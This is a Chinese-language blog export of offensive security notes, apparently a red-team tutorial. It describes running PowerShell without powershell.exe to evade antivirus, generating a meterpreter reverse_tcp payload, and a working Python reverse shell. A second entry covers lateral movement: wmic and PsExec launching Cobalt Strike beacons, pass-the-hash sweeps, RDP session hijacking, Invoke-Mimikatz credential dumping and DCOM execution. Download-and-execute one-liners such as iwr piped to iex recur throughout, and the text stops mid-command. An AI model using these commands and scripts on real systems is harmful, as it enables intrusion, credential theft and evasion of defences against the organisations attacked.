alt="image-20210204191638597"></p><p>加入完成以后，运行PLBuilder.exe进行构建，构建过程中，被360杀了。。</p><p> <img src="image-20210204191707416.png" alt="image-20210204191707416"></p><p>一般AV只是检测PS发出的恶意请求，但由于在powerline中，请求是由powerline发出的，便绕过了一部分AV，但是缺点也是很明显，就是可扩展性太差，所有的功能依赖于配置文件…</p><h4 id="2-powershdll"><a href="#2-powershdll" class="headerlink" title="2.powershdll"></a>2.powershdll</h4><p>这个工具主要使用dll去运行powershell而不需要去连接powershell.exe,所以具有一定的bypassAV能力，当然它也可以在这几个程序下运行rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe或者运行作者给的exe</p><p>下载地址： <a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a></p><p>1.exe用法</p><p>进入交互模式：<code>powershdll.exe -i</code>,获得了一个交互式的PS环境，可执行任意的powershell命令</p><p>在交互式模式下唯一要注意的就是，你输入的内容不能过长，否则会出现问题</p><p>2.dll用法</p><p>cmd下运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 PowerShdll.dll,main . &#123; iwr -useb https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1 &#125; ^| iex;</span><br></pre></td></tr></table></figure><p>被杀。。。</p><h4 id="3-Nopowershell"><a href="#3-Nopowershell" class="headerlink" title="3.Nopowershell"></a>3.Nopowershell</h4><p>NoPowerShell是用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。同时也提供了CS下的cna脚本。</p><p>优点：执行隐秘、功能强大、扩展简单</p><p>即使不熟悉PS命令也可以使用cmd命令来代替PS命令，例如(使用ping来代替Test-NetConnection)</p><p>下载地址：<a href="https://github.com/bitsadmin/nopowershell.git">https://github.com/bitsadmin/nopowershell.git</a></p><p>直接运行便会输出它的版本和支持的命令</p><p><img src="image-20210204192140180.png" alt="image-20210204192140180"></p><p>过程360无拦截</p><p>dll版会被秒杀</p><p>cs下稳定</p><h4 id="4-SyncAppvPublishingServer"><a href="#4-SyncAppvPublishingServer" class="headerlink" title="4.SyncAppvPublishingServer"></a>4.SyncAppvPublishingServer</h4><p>SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本 默认存放在<code>C:\Windows\System32</code>下面</p><p>弹出计算器：C:\Windows\System32\SyncAppvPublishingServer.vbs “Break; Start-Process Calc.exe ”</p><p> <img src="image-20210204192246804.png" alt="image-20210204192246804"></p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\SyncAppvPublishingServer.vbs &quot;Break; iwr http://192.168.1.149:443&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210204192445392.png" alt="image-20210204192445392"></p><p>也可以去远程下载执行一些ps脚本就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SyncAppvPublishingServer.exe \&quot; Break; (New-Object System.Net.WebClient).DownloadFile(&#x27;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&#x27;,&#x27;$env:USERPROFILE/1.ps1&#x27;); Start-Process &#x27;$env:USERPROFILE/1.ps1&#x27; -WindowStyle Minimized;&quot;</span><br><span class="line"></span><br><span class="line">SyncAppvPublishingServer.exe &quot;n;(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&#x27;) | IEX&quot;</span><br></pre></td></tr></table></figure><h4 id="5-调用Msbuild-exe"><a href="#5-调用Msbuild-exe" class="headerlink" title="5.调用Msbuild.exe"></a>5.调用Msbuild.exe</h4><p>MSBuild是Microsoft .NET框架的一部分，是受信任的Windows二进制文件，可用于在未安装Visual Studio的环境中构建应用程序。从安全的角度来看，应将此二进制文件从系统中删除或由应用程序白名单解决方案阻止，以防止执行存储在具有以下扩展名的文件中的任意代码</p><p>MSBuild是.Net框架中包含的工具，用于自动化创建软件产品的过程，包括编译源代码，打包，测试，部署和创建文档。</p><p>该二进制文件执行本地存储在系统上的代码的能力可能导致逃避现有的安全控件（组策略，应用程序白名单等），从而阻止PowerShell或其他依赖PowerShell的类似工具。但是，不再需要MSBuild执行代码，因为可以使用.NET程序集，该程序集将从远程位置（UNC路径）调用恶意的.csproj。该技术不会留下任何痕迹，因为它不会接触磁盘，并且代码已注入到合法的Windows进程Internet Explorer中。</p><p>Msbuild依赖于.csproj文件，该文件具有XML语法，包含了.NET构建过程中的结果，类似于unix中的make，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=&quot;4.0&quot;</span><br><span class="line">xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;</span><br><span class="line">&lt;Target Name=&quot;MSPSLess&quot;&gt;</span><br><span class="line">&lt;/Target&gt;</span><br><span class="line">&lt;PSLess/&gt;</span><br><span class="line">&lt;UsingTask TaskName=&quot;PSLess&quot; TaskFactory=&quot;CodeTaskFactory&quot;</span><br><span class="line">AssemblyFile=</span><br><span class="line">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">&lt;Task&gt;</span><br><span class="line">&lt;Code Type=&quot;Class&quot; Lang=&quot;cs&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">using System.Collections.ObjectModel;</span><br><span class="line">using System.Management.Automation;</span><br><span class="line">using System.Management.Automation.Runspaces;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.IO;</span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using Microsoft.Build.Framework;</span><br><span class="line">using Microsoft.Build.Utilities;</span><br><span class="line">public class PSLess :  Task</span><br><span class="line">&#123;</span><br><span class="line">  public override bool Execute()</span><br><span class="line">  &#123;</span><br><span class="line">   string buffer = &quot;&quot;;</span><br><span class="line">   try</span><br><span class="line">   &#123;</span><br><span class="line">     buffer = File.ReadAllText(&quot;c:/test/test.ps1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   catch (Exception e)</span><br><span class="line">   &#123;</span><br><span class="line">    Console.WriteLine(&quot;error:&quot; +e.Message);</span><br><span class="line">    Environment.Exit(2);</span><br><span class="line">   &#125;</span><br><span class="line">   buffer=RunScript(buffer);</span><br><span class="line">   Console.WriteLine(buffer);</span><br><span class="line">   return true;</span><br><span class="line"> &#125;</span><br><span class="line"> private static string RunScript(string script)</span><br><span class="line">  &#123;</span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline();</span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    foreach (PSObject pobject in outputs)</span><br><span class="line">    &#123;</span><br><span class="line">      sb.AppendLine(pobject.ToString());</span><br><span class="line">    &#125;</span><br><span class="line">    return sb.ToString();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">]]&gt;</span><br><span class="line">&lt; / Code&gt;</span><br><span class="line">&lt;/Task&gt;</span><br><span class="line">&lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><p>test.ps1的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello from powershell-less&quot;</span><br><span class="line">echo &quot;this is your pid:$PID&quot;</span><br><span class="line">$psversiontable</span><br></pre></td></tr></table></figure><p>执行test.ps1，效果：</p><p><img src="image-20210204204820918.png" alt="image-20210204204820918"></p><p>github上类似的项目：<a href="https://github.com/Cn33liz/MSBuildShell.git%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%AE%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84ps">https://github.com/Cn33liz/MSBuildShell.git，执行完可以获得一个交互式的ps</a></p><h2 id="3-msbuild-without-msbuild"><a href="#3-msbuild-without-msbuild" class="headerlink" title="3.msbuild_without_msbuild"></a>3.msbuild_without_msbuild</h2><p>不使用msbuild调用msbuild来构建程序的方法。</p><p>生成一个msf的payload并编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.1 LPORT=2000 base64 -i /root/payload64.bin &gt; payload64.txt</span><br></pre></td></tr></table></figure><p>然后使用下面的方法得到一个dll文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:&quot;Microsoft.Build.Framework.dll&quot;;&quot;Microsoft.Build.Tasks.v4.0.dll&quot;;&quot;Microsoft.Build.Utilities.v4.0.dll&quot; /target:library IEShim.cs</span><br></pre></td></tr></table></figure><p>得到dll后将msbuildapicaller.cs 的第60行替换成你smb服务器的程序地址..</p><p>smb服务器可以使用impacket开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share `pwd`</span><br></pre></td></tr></table></figure><p>替换msbuildapicaller.csproj中的shellcode与dll地址</p><p><img src="image-20210204211852420.png" alt="image-20210204211852420"></p><p>然后编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:&quot;Microsoft.Build.Framework.dll&quot;;&quot;Microsoft.Build.dll&quot;;&quot;Microsoft.Build.Engine.dll&quot;;&quot;Microsoft.Build.Utilities.v4.0.dll&quot;;&quot;System.Runtime.dll&quot; /target:exe msbuildapicaller.cs</span><br></pre></td></tr></table></figure><p>得到exe文，件，可以使用Assembly MSBuildApiCaller.exe去执行</p><h2 id="4-自写shell"><a href="#4-自写shell" class="headerlink" title="4.自写shell"></a>4.自写shell</h2><p>编写反弹shell的原理</p><p><img src="image-20210204212921171.png" alt="image-20210204212921171"></p><p>简单的客户端，服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">phone.bind((&#x27;127.0.0.1&#x27;,2333))</span><br><span class="line">phone.listen()</span><br><span class="line">phone.accept()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">phone.connect((&#x27;127.0.0.1&#x27;,2333))</span><br></pre></td></tr></table></figure><p>一些常用的实现通信的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">recv() #接受TCP数据</span><br><span class="line">send() #发送TCP数据</span><br><span class="line">recvfrom() #接受UDP数据</span><br><span class="line">sendto() #发送UDP数据</span><br><span class="line">getpeername() #接收到当前套接字远端的地址</span><br><span class="line">getsockname() #返回指定套接字的参数</span><br><span class="line">setsockopt() #设置指定套接字的参数</span><br><span class="line">close() #关闭套接字</span><br></pre></td></tr></table></figure><p>需要一个能够实现执行命令并返回会话的模块：subprocess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">#Popen方法是用来执行系统命令的，直接把结果打印到终端了</span><br><span class="line">res =subprocess.Popen(r&#x27;dir&#x27;,shell=True,</span><br><span class="line">                       #r&#x27;dsfsdfr&#x27;,shell=True,</span><br><span class="line">                      # stdin= #标准输入（不常用）</span><br><span class="line">                       stdout=subprocess.PIPE,#stdout 标准输出</span><br><span class="line">                       stderr=subprocess.PIPE) #stderr 标准错误</span><br><span class="line">print(res.stdout.read().decode(&#x27;gbk&#x27;))</span><br></pre></td></tr></table></figure><p>简单的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reve_shell(host,port):</span><br><span class="line"></span><br><span class="line">    host = socket.gethostbyname(host)</span><br><span class="line">    shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    shell.connect((host,port))</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        cmd = shell.recv(1024)</span><br><span class="line">        res = subprocess.Popen(cmd.decode(&#x27;utf-8&#x27;),</span><br><span class="line">                               shell=True,</span><br><span class="line">                               stdout=subprocess.PIPE,</span><br><span class="line">                               stderr=subprocess.PIPE)</span><br><span class="line">        stdout = res.stdout.read()</span><br><span class="line">        stderr = res.stderr.read()</span><br><span class="line"></span><br><span class="line">        shell.send(stdout+stderr)</span><br><span class="line"></span><br><span class="line">    shell.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    reve_shell(host=host,port=port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以直接执行，也可以打包为exe执行：<code>pyinstaller -F myfile.py</code></p><p>文章参考：</p><p><a href="https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html">https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</a></p><p><a href="https://lengjibo.github.io/psbypass/">https://lengjibo.github.io/psbypass/</a></p><p><a href="https://lengjibo.github.io/msbuild/">https://lengjibo.github.io/msbuild/</a></p><p><a href="https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/">https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/</a></p><p><a href="https://www.sec-in.com/article/178">https://www.sec-in.com/article/178</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Msf+donut交互式执行内存 </tag>
            
            <tag> 无powershell运行powershell五种方式 </tag>
            
            <tag> msbuild_without_msbuild </tag>
            
            <tag> 自写shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>在攻击者获取到某台内网机器的控制权限以及拿到其他机器的账户密码之后，进一步会考虑如何在内网进行横向移动，以及攻击域控服务器，本文总结了突破边界后进一步的攻击技巧。</p><span id="more"></span><h2 id="1-WMI"><a href="#1-WMI" class="headerlink" title="1.WMI"></a>1.WMI</h2><p>WMI全称”windows管理规范”，从win2003开始一直存在。</p><p><strong>利用条件</strong></p><p>1、WMI服务开启，端口135，默认开启。</p><p>2、防火墙允许135、445等端口通信。</p><p>3、管理员权限，以及本地管理员组..</p><p>关于域用户添加进本地管理组的方法，可以参考 <a href="https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/">https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/</a></p><p><strong>利用方法</strong></p><h3 id="1-windows自带wmic工具横向移动"><a href="#1-windows自带wmic工具横向移动" class="headerlink" title="1.windows自带wmic工具横向移动"></a>1.windows自带wmic工具横向移动</h3><p>先使用cs生成powershell上线载荷</p><p><img src="image-20210204130530497.png" alt="image-20210204130530497"><img src="image-20210204130606900.png" alt="image-20210204130606900"></p><p>cmd执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /NODE:目标ip /user:&quot;域\主机名&quot; /password:&quot;密码&quot; PROCESS call create &quot;webshell&quot;</span><br><span class="line">#注意wenshell的payload闭合时产生的双引号需要转义</span><br></pre></td></tr></table></figure><p><img src="image-20210204125808036.png" alt="image-20210204125808036"></p><p>cs成功上线。</p><h3 id="2-wmiexec-vbs"><a href="#2-wmiexec-vbs" class="headerlink" title="2.wmiexec.vbs"></a>2.wmiexec.vbs</h3><p>域环境下或者在工作组环境下都可以正常使用，使用域账号或者本地账户均可</p><p>工作组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.x.x administrator Aatest</span><br></pre></td></tr></table></figure><p>域环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 目标ip 域名\用户 密码</span><br></pre></td></tr></table></figure><p><img src="image-20210204131550106.png" alt="image-20210204131550106"></p><p>即得到目标的cmd</p><h3 id="3-Invoke-TheHash-ps1"><a href="#3-Invoke-TheHash-ps1" class="headerlink" title="3.Invoke-TheHash.ps1"></a>3.Invoke-TheHash.ps1</h3><p>在目标主机上分别导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1</p><p><img src="image-20210204131656073.png" alt="image-20210204131656073">!</p><p>批量撞网段内的机器即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target 192.168.93.0/24 -Domain 域控名 -Username administrator -Hash 已知hash</span><br></pre></td></tr></table></figure><p><img src="image-20210204132053457.png" alt="image-20210204132053457"></p><p>成功的机器可以使用WMI连接</p><h3 id="4-pth工具集（kali自带）"><a href="#4-pth工具集（kali自带）" class="headerlink" title="4.pth工具集（kali自带）"></a>4.pth工具集（kali自带）</h3><p>执行以下命令可以得到目标cmd环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U 账户名%&#x27;密码&#x27; --system --ostype=1 //目标ip cmd</span><br></pre></td></tr></table></figure><p><img src="image-20210204132324616.png" alt="image-20210204132324616"></p><h2 id="2-Remote-Service-Creation"><a href="#2-Remote-Service-Creation" class="headerlink" title="2.Remote Service Creation"></a>2.Remote Service Creation</h2><p>远程服务控制，可以通过smb安排任务，在客户机1上执行操作启动客户机2的服务，也就要求了客户机1对客户机2具有操作权限</p><p>先用cs生成一个服务类型的木马</p><p><img src="image-20210204133407667.png" alt="image-20210204133407667"></p><p>在客户机1上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\客户机2-ip create ExampleService binpath=&quot;path\service.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210204133613686.png" alt="image-20210204133613686"></p><p>成功创建了一个服务ExampleService，需要手动开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\客户机2-ip start ExampleService</span><br></pre></td></tr></table></figure><p><img src="image-20210204133824089.png" alt="image-20210204133824089"></p><p>此时cs会得到一个system的会话</p><p><img src="image-20210204133853885.png" alt="image-20210204133853885"></p><h2 id="3-Remote-Desktop-Protocol"><a href="#3-Remote-Desktop-Protocol" class="headerlink" title="3.Remote Desktop Protocol"></a>3.Remote Desktop Protocol</h2><p>远程桌面协议RDP。微软将其对远程桌面协议(rdp)的实现功能称为远程桌面服务(RDS)</p><h3 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a><strong>RDP hijacking</strong></h3><p>非常古老的方法。在system权限下，tscon.exe使用目标会话编号，就能够立即获取目标用户的桌面，不会留下痕迹</p><p><strong>利用</strong></p><p>假如在客户机1上查询会话时发现有客户机2登录此机器没有退出</p><p><img src="image-20210204134825571.png" alt="image-20210204134825571"></p><p>在客户机1执行：<code>JuicyPotato.exe -p &quot;tscon id&quot;</code></p><p><img src="image-20210204134905353.png" alt="image-20210204134905353"></p><p>成功就可以直接远程登录到客户机2的机器上</p><p>但是客户机2会被踢出登录的客户机1</p><p><img src="image-20210204135218438.png" alt="image-20210204135218438"></p><h2 id="4-PowerShell-Remoting"><a href="#4-PowerShell-Remoting" class="headerlink" title="4.PowerShell Remoting"></a>4.PowerShell Remoting</h2><p>winRM服务，2012之后默认开启，也可以使用以下命令开启：<code>winrm quickconfig</code></p><p>执行以下命令连接到开启了服务的机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -Computername TARGET</span><br></pre></td></tr></table></figure><p>或者远程获取机器的账号密码（利用条件：administrator或者winRM）：</p><p>在客户机2上导入mimikatz的ps1脚本<code>Import-Module .\mimikatz.ps1</code>，执行以下命令就可以获取客户机1的账户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -DumpCreds -ComputerName 客户机1-NAME.域控名</span><br></pre></td></tr></table></figure><p><img src="image-20210204140032023.png" alt="image-20210204140032023"></p><h2 id="5-Task-Scheduler"><a href="#5-Task-Scheduler" class="headerlink" title="5.Task Scheduler"></a>5.Task Scheduler</h2><p>计划任务，winodws内置，administrators执行 ,2008之后不能使用交互式了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at time /interactive cmd #不再可以使用这样的了</span><br></pre></td></tr></table></figure><p>且at变为schtasks</p><p>本地创建任务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create /SC ONCE /TN spawn /TR task_command /ST time</span><br><span class="line">#TN：任务名称</span><br><span class="line">#TR：任务执行的程序</span><br><span class="line">#ST：任务执行的时间</span><br></pre></td></tr></table></figure><p><img src="image-20210204141155993.png" alt="image-20210204141155993"></p><p>本地删除任务（cmd下）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Delete /TN spawn /F &gt;nul 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>远程创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create /S target /RU user_name /RP user_password /TN task_name /TR task_command /SC daily /ST time </span><br><span class="line"># task_command 只能是一个文件，不能是什么命令，例如启动一个木马，可以直接计划任务执行m木马，也可以写一个bat启动，然后计划任务执行此bat</span><br></pre></td></tr></table></figure><p>powershell版本执行方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>若你当前拥有一台机器的administrator权限，但是得不到域内的任何东西，也即无法与DC通信，可以尝试提权到system之后，就能与DC正常通信了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-PsExec"><a href="#6-PsExec" class="headerlink" title="6.PsExec"></a>6.PsExec</h2><h3 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h3><p>微软自家产品。通过ipc$连接，然后释放psexesvc.exe到目标机器；通过服务管理器SCManager远程创建psexecsvc服务，并启动服务；客户端连接执行命令，服务端启动相应程序并执行回显数据</p><p>得到指定域内机器cmd：<code>Psexec.exe \\域内主机名 cmd</code></p><p><img src="image-20210204153102437.png" alt="image-20210204153102437"></p><p>注:</p><p>1、远程机器的139 或445端口需要开启状态，即 SMB;</p><p>2、明文密码或者NTLM哈希;</p><p>3、具备将文件写入共享文件夹的权限;</p><p>4、能够在远程机器上创建服务:SC_MANAGER_CREATE_SERVICE(访问掩码:Ox0002);</p><p>5、能够启动所创建的服务:SERVICE_QUERY_STATUS (访问掩码:0x0004 )+SERVICE_START(访问掩码:Ox0010)</p><p>6、机器在第一次使用psexec的时候，会弹出确认提示框，为避免这个麻烦，可以加一个参数：<code>-accepteula</code></p><p>缺点:</p><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697、7045这2种事件日志;有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p><h3 id="2-cs自带psexec"><a href="#2-cs自带psexec" class="headerlink" title="2.cs自带psexec"></a>2.cs自带psexec</h3><p><img src="image-20210204153558664.png" alt="image-20210204153558664"></p><p>再指定账户密码，选择sessions</p><p><img src="image-20210204153909554.png" alt="image-20210204153909554"> </p><p>成功后会返回一个shell</p><p><img src="image-20210204154014712.png" alt="image-20210204154014712"></p><h2 id="7-DCOM"><a href="#7-DCOM" class="headerlink" title="7.DCOM"></a>7.DCOM</h2><p>微软介绍：windows Distributed component object Model ( DCOM) is transparent middleware that extends the functionality of component object Model (cOM) beyond a local computer using remote procedure call (RPC) technology.  COM is a component of the windows application programming interface(API) that enables interaction between software objects.Through OOM,a client object can call methods of server objects,which are typically Dynamic Link Libraries (DLL) or executables (EXE) .</p><p>就是一个中间件，支持交互。</p><p>枚举所有DCOM对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance win32-DCOMApplicationPS下</span><br></pre></td></tr></table></figure><p>部分docm能进行命令执行，通过这些dcom进行横向移动，例如</p><p><strong>MMC20.APPLICATION COM OBJECT</strong></p><p>可以使用以下命令查看DCOM的一些信息，再PS下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &#x27;registry::HKEY_CLASSES_ROOT_WOW6432Note\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E8608AC7F889&#125;&#x27;</span><br></pre></td></tr></table></figure><p>查询的出来的。。</p><p>远程利用方式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a =[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application.1&quot;, &quot;target_ip&quot;))</span><br><span class="line">$a.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot; 